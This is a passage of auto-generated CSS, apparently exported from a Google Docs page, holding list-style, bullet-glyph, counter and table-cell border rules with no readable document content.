0}ul.lst-kix_175jp61awd4f-6{list-style-type:none}.lst-kix_qst1zha6rauh-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_175jp61awd4f-5{list-style-type:none}ul.lst-kix_175jp61awd4f-8{list-style-type:none}.lst-kix_qst1zha6rauh-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_175jp61awd4f-7{list-style-type:none}ul.lst-kix_175jp61awd4f-2{list-style-type:none}ul.lst-kix_175jp61awd4f-1{list-style-type:none}.lst-kix_gi12qwmrr5vl-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_175jp61awd4f-4{list-style-type:none}ul.lst-kix_gi12qwmrr5vl-1{list-style-type:none}ul.lst-kix_175jp61awd4f-3{list-style-type:none}ul.lst-kix_gi12qwmrr5vl-0{list-style-type:none}ul.lst-kix_gi12qwmrr5vl-3{list-style-type:none}ul.lst-kix_gi12qwmrr5vl-2{list-style-type:none}.lst-kix_gi12qwmrr5vl-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_gi12qwmrr5vl-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_gvci0hu7yb6k-8{list-style-type:none}ul.lst-kix_gi12qwmrr5vl-5{list-style-type:none}ul.lst-kix_gi12qwmrr5vl-4{list-style-type:none}.lst-kix_qst1zha6rauh-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_gi12qwmrr5vl-7{list-style-type:none}ul.lst-kix_gvci0hu7yb6k-5{list-style-type:none}.lst-kix_gi12qwmrr5vl-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_gi12qwmrr5vl-6{list-style-type:none}.lst-kix_s5xocqmkj8s9-0&gt;li{counter-increment:lst-ctn-kix_s5xocqmkj8s9-0}ol.lst-kix_rs477lwege9r-7.start{counter-reset:lst-ctn-kix_rs477lwege9r-7 0}ul.lst-kix_gvci0hu7yb6k-4{list-style-type:none}ul.lst-kix_gvci0hu7yb6k-7{list-style-type:none}ul.lst-kix_gi12qwmrr5vl-8{list-style-type:none}.lst-kix_qst1zha6rauh-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_gvci0hu7yb6k-6{list-style-type:none}.lst-kix_2w36zq8cd80k-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_iivgfpfdl0t3-0{list-style-type:none}ul.lst-kix_3m5uvca0lm53-4{list-style-type:none}.lst-kix_gi12qwmrr5vl-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_3m5uvca0lm53-5{list-style-type:none}ul.lst-kix_anetktcl8su5-8{list-style-type:none}ul.lst-kix_3m5uvca0lm53-6{list-style-type:none}.lst-kix_qst1zha6rauh-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_3m5uvca0lm53-7{list-style-type:none}ul.lst-kix_iivgfpfdl0t3-4{list-style-type:none}ul.lst-kix_c8qgjiyn10ie-8{list-style-type:none}ul.lst-kix_3m5uvca0lm53-8{list-style-type:none}ul.lst-kix_iivgfpfdl0t3-3{list-style-type:none}.lst-kix_gi12qwmrr5vl-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_c8qgjiyn10ie-7{list-style-type:none}.lst-kix_2w36zq8cd80k-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_iivgfpfdl0t3-2{list-style-type:none}.lst-kix_gi12qwmrr5vl-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_iivgfpfdl0t3-1{list-style-type:none}.lst-kix_qst1zha6rauh-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_qst1zha6rauh-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_fvisx24ngp1u-2&gt;li{counter-increment:lst-ctn-kix_fvisx24ngp1u-2}.lst-kix_qst1zha6rauh-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_2w36zq8cd80k-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_gi12qwmrr5vl-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_3m5uvca0lm53-0{list-style-type:none}ul.lst-kix_3m5uvca0lm53-1{list-style-type:none}.lst-kix_2w36zq8cd80k-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_2w36zq8cd80k-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_gi12qwmrr5vl-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_3m5uvca0lm53-2{list-style-type:none}ol.lst-kix_82pihj16nguk-0{list-style-type:none}.lst-kix_qst1zha6rauh-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_3m5uvca0lm53-3{list-style-type:none}.lst-kix_rs477lwege9r-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_rs477lwege9r-8,lower-roman) &quot;. &quot;}.lst-kix_rs477lwege9r-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_rs477lwege9r-7,lower-latin) &quot;. &quot;}.lst-kix_2w36zq8cd80k-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_2w36zq8cd80k-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_anetktcl8su5-1{list-style-type:none}ul.lst-kix_anetktcl8su5-0{list-style-type:none}ul.lst-kix_anetktcl8su5-3{list-style-type:none}ul.lst-kix_anetktcl8su5-2{list-style-type:none}.lst-kix_2w36zq8cd80k-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_anetktcl8su5-5{list-style-type:none}ul.lst-kix_anetktcl8su5-4{list-style-type:none}.lst-kix_2w36zq8cd80k-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_anetktcl8su5-7{list-style-type:none}ul.lst-kix_anetktcl8su5-6{list-style-type:none}ol.lst-kix_s5xocqmkj8s9-3.start{counter-reset:lst-ctn-kix_s5xocqmkj8s9-3 0}ol.lst-kix_rs477lwege9r-2.start{counter-reset:lst-ctn-kix_rs477lwege9r-2 0}ol.lst-kix_fvisx24ngp1u-5.start{counter-reset:lst-ctn-kix_fvisx24ngp1u-5 0}.lst-kix_ne238lfomw56-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ne238lfomw56-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ne238lfomw56-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_iivgfpfdl0t3-8{list-style-type:none}ul.lst-kix_iivgfpfdl0t3-7{list-style-type:none}ul.lst-kix_iivgfpfdl0t3-6{list-style-type:none}ul.lst-kix_iivgfpfdl0t3-5{list-style-type:none}.lst-kix_s8f9k49k9svk-6&gt;li{counter-increment:lst-ctn-kix_s8f9k49k9svk-6}.lst-kix_rs477lwege9r-3&gt;li{counter-increment:lst-ctn-kix_rs477lwege9r-3}.lst-kix_ne238lfomw56-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_ne238lfomw56-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ne238lfomw56-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ne238lfomw56-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ne238lfomw56-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_ne238lfomw56-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_fvisx24ngp1u-6&gt;li{counter-increment:lst-ctn-kix_fvisx24ngp1u-6}.lst-kix_iivgfpfdl0t3-0&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_rs477lwege9r-0.start{counter-reset:lst-ctn-kix_rs477lwege9r-0 0}.lst-kix_iivgfpfdl0t3-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_s40msnqz5os7-0{list-style-type:none}.lst-kix_4ao7uanj5htj-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_s8ghxl62e844-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_s8ghxl62e844-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_s5xocqmkj8s9-7&gt;li{counter-increment:lst-ctn-kix_s5xocqmkj8s9-7}.lst-kix_s8ghxl62e844-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_s8f9k49k9svk-3&gt;li{counter-increment:lst-ctn-kix_s8f9k49k9svk-3}.lst-kix_iivgfpfdl0t3-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_rs477lwege9r-0&gt;li{counter-increment:lst-ctn-kix_rs477lwege9r-0}.lst-kix_w06aeeqvjm56-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_w06aeeqvjm56-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_fvisx24ngp1u-8.start{counter-reset:lst-ctn-kix_fvisx24ngp1u-8 0}.lst-kix_q9nppjnnwv68-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_q9nppjnnwv68-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_fvisx24ngp1u-5&gt;li{counter-increment:lst-ctn-kix_fvisx24ngp1u-5}ol.lst-kix_9i4egiire8k6-4.start{counter-reset:lst-ctn-kix_9i4egiire8k6-4 0}.lst-kix_2gqv10mkziv8-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_4ao7uanj5htj-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_iivgfpfdl0t3-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_iivgfpfdl0t3-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_q9nppjnnwv68-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_q9nppjnnwv68-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_w06aeeqvjm56-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_s8ghxl62e844-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_2gqv10mkziv8-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_4ao7uanj5htj-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_4ao7uanj5htj-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_2gqv10mkziv8-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_fvisx24ngp1u-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fvisx24ngp1u-7,lower-latin) &quot;. &quot;}.lst-kix_9i4egiire8k6-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_9i4egiire8k6-1,lower-latin) &quot;. &quot;}.lst-kix_9i4egiire8k6-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_9i4egiire8k6-3,decimal) &quot;. &quot;}.lst-kix_anetktcl8su5-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_l7ahywf1ghkc-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_l7ahywf1ghkc-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_pvxkc5ur63o3-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_4ee45band27p-8{list-style-type:none}.lst-kix_anetktcl8su5-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_4ee45band27p-7{list-style-type:none}.lst-kix_fvisx24ngp1u-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fvisx24ngp1u-3,decimal) &quot;. &quot;}ul.lst-kix_4ee45band27p-6{list-style-type:none}ul.lst-kix_4ee45band27p-5{list-style-type:none}.lst-kix_9i4egiire8k6-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_9i4egiire8k6-7,lower-latin) &quot;. &quot;}ul.lst-kix_4ee45band27p-4{list-style-type:none}ul.lst-kix_4ee45band27p-3{list-style-type:none}.lst-kix_fvisx24ngp1u-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fvisx24ngp1u-1,lower-latin) &quot;. &quot;}ul.lst-kix_4ee45band27p-2{list-style-type:none}.lst-kix_l7ahywf1ghkc-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_4ee45band27p-1{list-style-type:none}.lst-kix_pvxkc5ur63o3-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_pvxkc5ur63o3-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_4ee45band27p-0{list-style-type:none}ol.lst-kix_s5xocqmkj8s9-0.start{counter-reset:lst-ctn-kix_s5xocqmkj8s9-0 0}.lst-kix_anetktcl8su5-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_anetktcl8su5-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_2gqv10mkziv8-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_c8qgjiyn10ie-4{list-style-type:none}ul.lst-kix_c8qgjiyn10ie-3{list-style-type:none}ul.lst-kix_c8qgjiyn10ie-6{list-style-type:none}ul.lst-kix_c8qgjiyn10ie-5{list-style-type:none}ul.lst-kix_c8qgjiyn10ie-0{list-style-type:none}.lst-kix_fvisx24ngp1u-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fvisx24ngp1u-5,lower-roman) &quot;. &quot;}ul.lst-kix_c8qgjiyn10ie-2{list-style-type:none}ul.lst-kix_c8qgjiyn10ie-1{list-style-type:none}.lst-kix_w06aeeqvjm56-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_gsnrn3gksa0-5{list-style-type:none}ul.lst-kix_gsnrn3gksa0-4{list-style-type:none}ul.lst-kix_gsnrn3gksa0-7{list-style-type:none}ul.lst-kix_gsnrn3gksa0-6{list-style-type:none}.lst-kix_rs477lwege9r-7&gt;li{counter-increment:lst-ctn-kix_rs477lwege9r-7}ul.lst-kix_gsnrn3gksa0-1{list-style-type:none}ul.lst-kix_gsnrn3gksa0-0{list-style-type:none}ul.lst-kix_gsnrn3gksa0-3{list-style-type:none}ul.lst-kix_gsnrn3gksa0-2{list-style-type:none}.lst-kix_3m5uvca0lm53-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_gsnrn3gksa0-8{list-style-type:none}ul.lst-kix_s40msnqz5os7-4{list-style-type:none}ul.lst-kix_s40msnqz5os7-3{list-style-type:none}ul.lst-kix_s40msnqz5os7-2{list-style-type:none}ol.lst-kix_9i4egiire8k6-2.start{counter-reset:lst-ctn-kix_9i4egiire8k6-2 0}ul.lst-kix_s40msnqz5os7-1{list-style-type:none}ul.lst-kix_s40msnqz5os7-8{list-style-type:none}ul.lst-kix_s40msnqz5os7-7{list-style-type:none}ul.lst-kix_s40msnqz5os7-6{list-style-type:none}.lst-kix_pvxkc5ur63o3-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_s40msnqz5os7-5{list-style-type:none}ul.lst-kix_30z58zep11nd-2{list-style-type:none}ul.lst-kix_30z58zep11nd-3{list-style-type:none}ul.lst-kix_30z58zep11nd-4{list-style-type:none}ul.lst-kix_30z58zep11nd-5{list-style-type:none}.lst-kix_9i4egiire8k6-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_9i4egiire8k6-5,lower-roman) &quot;. &quot;}.lst-kix_s5xocqmkj8s9-8&gt;li{counter-increment:lst-ctn-kix_s5xocqmkj8s9-8}ul.lst-kix_30z58zep11nd-0{list-style-type:none}ul.lst-kix_30z58zep11nd-1{list-style-type:none}.lst-kix_pvxkc5ur63o3-4&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_s5xocqmkj8s9-0{list-style-type:none}ol.lst-kix_s5xocqmkj8s9-1{list-style-type:none}ul.lst-kix_30z58zep11nd-6{list-style-type:none}ol.lst-kix_s5xocqmkj8s9-4{list-style-type:none}ul.lst-kix_30z58zep11nd-7{list-style-type:none}ol.lst-kix_s5xocqmkj8s9-5{list-style-type:none}ul.lst-kix_30z58zep11nd-8{list-style-type:none}ol.lst-kix_s5xocqmkj8s9-2{list-style-type:none}ol.lst-kix_s5xocqmkj8s9-3{list-style-type:none}ol.lst-kix_s5xocqmkj8s9-8{list-style-type:none}ol.lst-kix_s5xocqmkj8s9-6{list-style-type:none}ol.lst-kix_s5xocqmkj8s9-7{list-style-type:none}.lst-kix_3m5uvca0lm53-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_3m5uvca0lm53-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_4ao7uanj5htj-0{list-style-type:none}.lst-kix_30z58zep11nd-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_4ao7uanj5htj-2{list-style-type:none}ul.lst-kix_4ao7uanj5htj-1{list-style-type:none}.lst-kix_30z58zep11nd-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_4ao7uanj5htj-4{list-style-type:none}ul.lst-kix_4ao7uanj5htj-3{list-style-type:none}ul.lst-kix_4ao7uanj5htj-6{list-style-type:none}ul.lst-kix_4ao7uanj5htj-5{list-style-type:none}.lst-kix_fvisx24ngp1u-1&gt;li{counter-increment:lst-ctn-kix_fvisx24ngp1u-1}ul.lst-kix_4ao7uanj5htj-8{list-style-type:none}ul.lst-kix_4ao7uanj5htj-7{list-style-type:none}ul.lst-kix_s8ghxl62e844-8{list-style-type:none}ul.lst-kix_s8ghxl62e844-7{list-style-type:none}.lst-kix_l7ahywf1ghkc-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_s8ghxl62e844-6{list-style-type:none}ul.lst-kix_s8ghxl62e844-5{list-style-type:none}ul.lst-kix_s8ghxl62e844-4{list-style-type:none}ul.lst-kix_s8ghxl62e844-3{list-style-type:none}ul.lst-kix_s8ghxl62e844-2{list-style-type:none}.lst-kix_9i4egiire8k6-7&gt;li{counter-increment:lst-ctn-kix_9i4egiire8k6-7}ul.lst-kix_s8ghxl62e844-1{list-style-type:none}ul.lst-kix_s8ghxl62e844-0{list-style-type:none}.lst-kix_rs477lwege9r-8&gt;li{counter-increment:lst-ctn-kix_rs477lwege9r-8}.lst-kix_anetktcl8su5-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_si5ikxnlj1q7-4{list-style-type:none}ul.lst-kix_si5ikxnlj1q7-3{list-style-type:none}ul.lst-kix_si5ikxnlj1q7-6{list-style-type:none}ul.lst-kix_si5ikxnlj1q7-5{list-style-type:none}ul.lst-kix_si5ikxnlj1q7-0{list-style-type:none}.lst-kix_2gqv10mkziv8-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_s5xocqmkj8s9-3&gt;li{counter-increment:lst-ctn-kix_s5xocqmkj8s9-3}ul.lst-kix_si5ikxnlj1q7-2{list-style-type:none}ul.lst-kix_si5ikxnlj1q7-1{list-style-type:none}ol.lst-kix_9i4egiire8k6-0.start{counter-reset:lst-ctn-kix_9i4egiire8k6-0 0}ul.lst-kix_si5ikxnlj1q7-8{list-style-type:none}ul.lst-kix_si5ikxnlj1q7-7{list-style-type:none}.lst-kix_175jp61awd4f-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_175jp61awd4f-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_175jp61awd4f-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_175jp61awd4f-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_rs477lwege9r-4{list-style-type:none}.lst-kix_fvisx24ngp1u-3&gt;li{counter-increment:lst-ctn-kix_fvisx24ngp1u-3}ol.lst-kix_rs477lwege9r-3{list-style-type:none}ol.lst-kix_rs477lwege9r-2{list-style-type:none}ol.lst-kix_rs477lwege9r-1{list-style-type:none}ol.lst-kix_rs477lwege9r-8{list-style-type:none}ol.lst-kix_rs477lwege9r-7{list-style-type:none}ol.lst-kix_rs477lwege9r-6{list-style-type:none}ol.lst-kix_rs477lwege9r-5{list-style-type:none}.lst-kix_175jp61awd4f-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_rs477lwege9r-0{list-style-type:none}ul.lst-kix_ne238lfomw56-2{list-style-type:none}ul.lst-kix_ne238lfomw56-1{list-style-type:none}ul.lst-kix_ne238lfomw56-4{list-style-type:none}ul.lst-kix_ne238lfomw56-3{list-style-type:none}.lst-kix_c8qgjiyn10ie-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_ne238lfomw56-6{list-style-type:none}ul.lst-kix_ne238lfomw56-5{list-style-type:none}.lst-kix_4ao7uanj5htj-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_ne238lfomw56-8{list-style-type:none}ul.lst-kix_ne238lfomw56-7{list-style-type:none}.lst-kix_88bs2bqozfm2-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_c8qgjiyn10ie-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_sxdyd6bfs1ox-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_gvci0hu7yb6k-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_iivgfpfdl0t3-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_s8ghxl62e844-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_88bs2bqozfm2-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_sxdyd6bfs1ox-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_gvci0hu7yb6k-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_iivgfpfdl0t3-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_s8ghxl62e844-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_qst1zha6rauh-6{list-style-type:none}.lst-kix_fvisx24ngp1u-8&gt;li{counter-increment:lst-ctn-kix_fvisx24ngp1u-8}ul.lst-kix_qst1zha6rauh-5{list-style-type:none}.lst-kix_s8f9k49k9svk-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s8f9k49k9svk-2,lower-roman) &quot;. &quot;}.lst-kix_s8f9k49k9svk-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s8f9k49k9svk-6,decimal) &quot;. &quot;}.lst-kix_w06aeeqvjm56-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_qst1zha6rauh-8{list-style-type:none}.lst-kix_82pihj16nguk-0&gt;li{counter-increment:lst-ctn-kix_82pihj16nguk-0}ul.lst-kix_qst1zha6rauh-7{list-style-type:none}ul.lst-kix_qst1zha6rauh-2{list-style-type:none}ul.lst-kix_qst1zha6rauh-1{list-style-type:none}ul.lst-kix_qst1zha6rauh-4{list-style-type:none}ul.lst-kix_qst1zha6rauh-3{list-style-type:none}.lst-kix_9fzrrhqm4j52-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_sxdyd6bfs1ox-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_2gqv10mkziv8-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_qst1zha6rauh-0{list-style-type:none}.lst-kix_q9nppjnnwv68-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_9fzrrhqm4j52-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_4ao7uanj5htj-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_w06aeeqvjm56-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_2gqv10mkziv8-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_gvci0hu7yb6k-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_ne238lfomw56-0{list-style-type:none}.lst-kix_q9nppjnnwv68-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_82pihj16nguk-6{list-style-type:none}.lst-kix_l7ahywf1ghkc-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_fvisx24ngp1u-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fvisx24ngp1u-6,decimal) &quot;. &quot;}ul.lst-kix_82pihj16nguk-7{list-style-type:none}.lst-kix_9argrz9zfbv7-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_s40msnqz5os7-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_82pihj16nguk-4{list-style-type:none}.lst-kix_pvxkc5ur63o3-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_82pihj16nguk-5{list-style-type:none}ul.lst-kix_82pihj16nguk-2{list-style-type:none}ul.lst-kix_82pihj16nguk-3{list-style-type:none}.lst-kix_anetktcl8su5-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_82pihj16nguk-1{list-style-type:none}.lst-kix_fvisx24ngp1u-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fvisx24ngp1u-2,lower-roman) &quot;. &quot;}.lst-kix_s40msnqz5os7-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_pvxkc5ur63o3-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_9i4egiire8k6-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_9i4egiire8k6-0,decimal) &quot;. &quot;}.lst-kix_9i4egiire8k6-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_9i4egiire8k6-8,lower-roman) &quot;. &quot;}.lst-kix_anetktcl8su5-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_9argrz9zfbv7-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_82pihj16nguk-8{list-style-type:none}.lst-kix_9i4egiire8k6-2&gt;li{counter-increment:lst-ctn-kix_9i4egiire8k6-2}ul.lst-kix_pvxkc5ur63o3-8{list-style-type:none}.lst-kix_w06aeeqvjm56-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_s5xocqmkj8s9-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s5xocqmkj8s9-2,lower-roman) &quot;. &quot;}.lst-kix_si5ikxnlj1q7-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_si5ikxnlj1q7-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_3m5uvca0lm53-6&gt;li:before{content:&quot;\0025cf   &quot;}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_30z58zep11nd-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_s8f9k49k9svk-1&gt;li{counter-increment:lst-ctn-kix_s8f9k49k9svk-1}.lst-kix_s5xocqmkj8s9-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_s5xocqmkj8s9-6,decimal) &quot;. &quot;}ul.lst-kix_pvxkc5ur63o3-3{list-style-type:none}ul.lst-kix_pvxkc5ur63o3-2{list-style-type:none}ul.lst-kix_pvxkc5ur63o3-1{list-style-type:none}.lst-kix_9argrz9zfbv7-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_pvxkc5ur63o3-0{list-style-type:none}ul.lst-kix_pvxkc5ur63o3-7{list-style-type:none}ul.lst-kix_pvxkc5ur63o3-6{list-style-type:none}ul.lst-kix_pvxkc5ur63o3-5{list-style-type:none}.lst-kix_s5xocqmkj8s9-5&gt;li{counter-increment:lst-ctn-kix_s5xocqmkj8s9-5}.lst-kix_9i4egiire8k6-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_9i4egiire8k6-4,lower-latin) &quot;. &quot;}ul.lst-kix_pvxkc5ur63o3-4{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.MvcjwGOuIU-c27{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#d9d9d9;border-left-style:solid;border-bottom-width:1pt;width:239.2pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c62{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:2.2pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:dotted;background-color:#b6d7a8;border-left-style:solid;border-bottom-width:1pt;width:210.8pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c56{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#b6d7a8;border-left-style:solid;border-bottom-width:1pt;width:54.8pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c48{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:middle;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#d9ead3;border-left-style:solid;border-bottom-width:1pt;width:488.2pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c44{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#d9d9d9;border-left-style:solid;border-bottom-width:1pt;width:56.2pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c46{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:middle;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#d9d9d9;border-left-style:solid;border-bottom-width:1pt;width:159.8pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c77{border-right-style:solid;padding:5pt 5pt 5pt 